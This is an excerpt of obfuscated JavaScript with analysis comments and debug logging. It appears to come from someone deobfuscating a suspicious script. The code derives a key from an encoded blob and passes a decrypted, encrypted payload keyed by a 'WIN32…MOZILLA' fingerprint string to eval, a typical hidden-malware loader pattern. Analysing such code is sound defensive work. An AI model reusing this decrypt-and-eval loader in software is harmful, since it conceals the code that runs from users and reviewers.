...
(T.e0 = function(a, b) {
  ...
  // b = WIN3200000EN0000011MOZILLA003
  (T.d0 = function(a, b) {
    var key, d;
    return (
      (a = String(a)),
      ...
      0 == a.length
        ? ""
        : ((key = T.f0(a.b1())), //a.b1() returns utf-8 string of a base64 buffer. Length of a.b1() is 133.
          console.log(a.b1()),
          (d = T.f0(b.u0().slice(0, 16))),
          key.length,
          (key = T.d1(key, d)),
  ...
  // first call ret is with array size 34
  // second call ret array size 1
  (T.f0 = function(a) {
    var ret = new Array(Math.ceil(a.length / 4));
    console.log(ret);
    for (var i = 0; i < ret.length; i++)
      ret[i] =
        a.charCodeAt(4 * i) +
        (a.charCodeAt(4 * i + 1) << 8) +
        (a.charCodeAt(4 * i + 2) << 16) +
        (a.charCodeAt(4 * i + 3) << 24);
    return ret;
  }),
  ...
  "undefined" == typeof String.prototype.b1 &&
    (String.prototype.b1 = function() {
      ...
      if ("undefined" != typeof Buffer)
        //console.log(this);
        //console.log(new Buffer(this, "base64").toString("base64"));
        // turn into base 64 then back into utf-8 which obfuscates the string.
...
a ="A2xcVTrDuF+EqdD8VibVZIWY2k334hwWPsIzgPgmHSapj+zeDlPqH/RHlpVCitdlxQQfzOjO01xCW/6TNqkciPRbOZsizdYNf5eEOgghG0YhmIplCBLhGdxmnvsIT/69I08I/ZvIxkWyufhLayTDzFeGZlPQfjqtY8Wr59Lkw/JggztpJYPWng==";
console.log(eval(T.d0(a, "WIN3200000EN0000011MOZILLA003")));
